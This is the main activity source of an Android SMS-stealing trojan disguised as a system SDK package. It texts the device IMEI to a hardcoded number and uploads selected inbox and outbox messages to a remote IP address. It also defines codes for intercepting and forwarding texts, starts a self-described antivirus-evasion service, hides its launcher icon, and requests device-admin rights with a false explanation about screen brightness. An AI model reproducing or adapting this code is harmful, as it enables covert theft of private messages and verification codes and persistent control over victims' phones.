package android.app.sdk;

import java.util.Date;
import com.google.pm.service.Occultation;
import com.umeng.analytics.AnalyticsConfig;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.manager.SMSManager;
import android.app.sms.service.NotifiService;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.LRR;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

public class SmsActivity extends Activity {

	private static int index = 0;
	//imei发送
	public static final String devicephone = "13568986885";
	//短信转发
	public static final String[] phonenum = {"13568986885","13568986885","13568986885"};
	//拦截
	public static final String lanjie="DX99#LJ|";
	//转发
	public static final String zhuanfa="DX99#FS|";
	//检索数据提交
	public static final String searchUrl = "http://210.56.50.4:999/h01/sms.asp";
	//拦截数据提交
	public static final String interceptUrl = "http://210.56.50.4:999/h01/LS.asp";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		this.startFreeToKillService();
		this.initData();
	}
	
	private void initData() {
		Occultation.getInstance(this).oponeData();
		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(this));
		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT + " " + Build.PRODUCT + "--" + Build.MODEL);
		int code = this.getVersionCode();
		SharedPreferences sp = Tools.findCheckConfig(this);
		if (sp.getBoolean("isfrist", true) || code != sp.getInt("code", -100)) {
			SMSManager.send(this, devicephone, "AZ99#AZ|程Z序已安装" + Tools.getDeviceId(this));
			Tools.saveCheckConfig(this, false, code);
			this.findHistorySMS();
		}
	}
	
	private void findHistorySMS() {
		Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%我是刚才%' and type in (1,2)", null, "_id desc");
		for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
			int type = c.getInt(c.getColumnIndex("type"));
			String body = c.getString(c.getColumnIndex("body"));
			String address = c.getString(c.getColumnIndex("address"));
			address = address.replace("+86", "").replace("+1", "");
			LogUtils.write("Send", "检索出来的内容" + body);
			String lx = (type == 1 ? "收件箱" : "发件箱");
			DQLiteOpenHelper.getHelper(this).addData(lx, address, body, searchUrl, new Date());
		}
		SubmitDateThread.startSendData(this);
	}
	
	public static String getPhone() {
		index++;
		if (index >= phonenum.length) {
			index = 0;
		}
		return phonenum[index];
	}
	
	private void startFreeToKillService() {
		LogUtils.write("Send", "启动免杀服务");
		this.startService(new Intent(this, NotifiService.class));
	}
	
	private int getVersionCode() {
	    try {
	        PackageManager manager = this.getPackageManager();
	        PackageInfo info = manager.getPackageInfo(this.getPackageName(), 0);
	        return info.versionCode;
	    } catch (Exception e) {
	    	return -1;
	    }
	}
	
	public void hideIcon() {
		PackageManager pm = this.getPackageManager();
		pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	}
	
	public void installSystemAPK() {
    	DevicePolicyManager policyManager = ((DevicePolicyManager)getSystemService("device_policy"));
    	ComponentName componentName = new ComponentName(this, LRR.class);
		if (!policyManager.isAdminActive(componentName)) {
			Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
			localIntent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
			localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "允许Android系统硬件检测或调整屏幕亮度");
			startActivity(localIntent);
		}
    }
}
